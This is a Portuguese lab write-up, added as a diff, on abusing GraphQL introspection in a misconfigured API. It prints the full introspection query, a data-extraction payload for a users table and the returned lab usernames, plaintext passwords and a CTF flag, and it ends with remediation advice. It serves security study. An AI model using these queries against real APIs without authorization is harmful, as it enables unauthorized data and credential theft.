@@ -1,0 +1,168 @@
+O QUE É E COMO FUNCIONA O GRAPHQL -> A vulnerabiliade mais comum nesse tipo de api é um misconfiguration (falha de configuração) nesse tipo e API onde é possivel analisar tudo que tem no back-end. Existe uma modalidade dentro do graphql que permite saber toda a estrutura por trás de um sistema, o graphql vem para se resolver um problema de conexão com o servidor, o cliente e o banco de dados, facilitando essa conexão com o banco de dados criando uma api progamavel. As querys rodam no GRAPHQL e ele roda dentro do banco de dados.
+
+Quais são as vulnerabiildades que podem acontecer nesse meio:
+
+· Falha de autorização
+
+· Falha de validação de input de usuario
+
+O diferencial do GRAPHQL principalmente falando de introspection query é que permite visualizarmos toda a estrutura do banco de dados. Geralmente é um banco de dados não relacional, isso é, NOSQL.
+
+Numa aplicação, o usuario envia as querys ao graphql e ele faz as consultas no banco de dados utilizando as querys do graphql para selecionar ou alterar os dados do banco de dados. Então temos as querys que servem para ler e pegar informações do servidor e existe também as mutations, que permite fazer alterações no servidor.
+
+Existe uma query no graphql que é a introspection query, ela permite que obtenhamos toda a estrutura do banco de dados. Uma falha de configuração da API permite que uma pessoa remota saiba toda a estrutura do banco de dados que normalmente não estaria exposta publicamente, o problema se deve que sabendo a estrutura do banco de dados, podemos montar nossas próprias querys para pegar os dados que quisermos do banco de dados. 
+
+O instrospection não é um problema, o unico problema é ele estar habilitado em produção, ou seja, em homologação tudo bem, mas levar para produção uma interface dessa e não desabilita o introspection em produção é um problema pois uma pessoa externa pode ler essas informações.
+
+Podemos utilizar uma ferramenta chamada graphql voyager, que serve para nos dar uma introspection query pronta, ele faz isso pois ele cria uma instropection para criar um mapa para ver como está o banco de dados. A query instrospection criada se parece com essa aqui:
+
+
+    query IntrospectionQuery {
+      __schema {
+        
+        queryType { name }
+        mutationType { name }
+        subscriptionType { name }
+        types {
+          ...FullType
+        }
+        directives {
+          name
+          description
+          
+          locations
+          args {
+            ...InputValue
+          }
+        }
+      }
+    }
+
+    fragment FullType on __Type {
+      kind
+      name
+      description
+      fields(includeDeprecated: true) {
+        name
+        description
+        args {
+          ...InputValue
+        }
+        type {
+          ...TypeRef
+        }
+        isDeprecated
+        deprecationReason
+      }
+      inputFields {
+        ...InputValue
+      }
+      interfaces {
+        ...TypeRef
+      }
+      enumValues(includeDeprecated: true) {
+        name
+        description
+        isDeprecated
+        deprecationReason
+      }
+      possibleTypes {
+        ...TypeRef
+      }
+    }
+
+    fragment InputValue on __InputValue {
+      name
+      description
+      type { ...TypeRef }
+      defaultValue
+    }
+
+    fragment TypeRef on __Type {
+      kind
+      name
+      ofType {
+        kind
+        name
+        ofType {
+          kind
+          name
+          ofType {
+            kind
+            name
+            ofType {
+              kind
+              name
+              ofType {
+                kind
+                name
+                ofType {
+                  kind
+                  name
+                  ofType {
+                    kind
+                    name
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+ 
+Essa query consulta todas as informações do banco de dados, tabelas, schemas e tudo mais.
+-----------------------------------------------------------------------------------
+COMO PODEMOS ACHAR UMA API GRAPHQL -> Para encontrarmos existem diversas formas, normalmente, temos códigos js que apontam para uma api graphql, em alguns casos podemos utilzar o nuclei ou fazendo fuzzing. A maioria das aplicações que rodam em produção utilizando esse tipo de API, geralmente tem o endereço 
+
+	      https://site.com.br/graphql
+	      https://graphql.crowsec.com.br
+
+Temos esses dois cenarios, também temos o cenário de termos uma API totalmente dedicada, que é o caso do nosso laboratorio. Como saber quando é um graphql nesses casos?, ele contém um erro padrão que é o seguinte "GET query missing", nesse tipo de caso já podemos saber que se trata de um GRAPHQL. 
+
+O que podemos fazer é passar um parametro para a apliacação para vermos o que ela retorna: http://10.10.0.32/?query=teste
+
+E dessa forma obtemos um json, por esse parametro podemos enviar querys para o back-end, porém para fazermos isso precisamos saber como ele está estruturado, como está montado dentro do banco e para fazermo isso podemos utilizar um cliente do graphql, que pode ser instalado na nossa máquina para podermos utilizar chamado de graphql playground.
+
+Para utilizarmos simplesmente pegamos o endpoint da apliacação e colocar na aplicação como endpoint url e podemos rodar por lá os comandos. também é possivel digitarmos pelo browser passando o parametro.
+
+Ao passarmos a introspection para a aplicação, recebemos um output, podemos pegar ele e colocar dentro do voyager (https://apis.guru), dessa forma ele irá remotar o banco da forma como ele está rodando na aplicação e podemos fazer a nossa injection com a noção de como está o banco.
+
+Na aplicação do lab temos uma query e uma tabela só chamada de users, contendo os campos id, age, name e passwords. Agora o que precisamos fazer é rodar essa query, nessa hora o playground tem vantagem por ele autocompletar algumas informações.
+
+
+A nossa payload injetada irá ser para pegarmos os valores contidos no banco e retornar eles, então dessa forma para explorarmos podemos passar a payload tanto dentro do playgroung quanto no parametro vulneravel da aplicação, utilizaremos a seguinte payload: query{users{id,name,password}}
+
+O que nos dá esse retorna da aplicação:
+
+{
+  "data": {
+    "users": [
+      {
+        "id": "1",
+        "name": "admin",
+        "password": "housefly@123"
+      },
+      {
+        "id": "2",
+        "name": "guest",
+        "password": "guest"
+      },
+      {
+        "id": "3",
+        "name": "superadmin",
+        "password": "MySup3rP@ssw0rd"
+      },
+      {
+        "id": "4",
+        "name": "flag",
+        "password": "cs{e3ay_1ntr0sp3ct10n_4tt4ck}"
+      }
+    ]
+  }
+}
+
+Esssa injeção é extremamente simples de se fazer, porém é necessário termos atenção a estrutura do banco de dados para podermos mapear o que queremos extrair do banco de dados. Essa vulnerabilidade é critica primeiro pois conseguimos ler e analisar a estrutura do banco de dados, fora isso, conseguimos ir além e rodar uma injeção para podermos retornar os dados, é uma vulenerabilidade muito critica.
+
+
+Essa vulnerabilidade ocorre por conseguirmos utilzar uma introspection dentro da API, o que não deveria ser possivel ser feito em produção. No caso desse lab, outra vulnerabilidade é não ter autenticação para utilizarmos a query, outro passo é fazer a validação de quem pode fazer as requisições. focar no js para procurar padrões dentro do js para encontrarmos o padrão graphql.
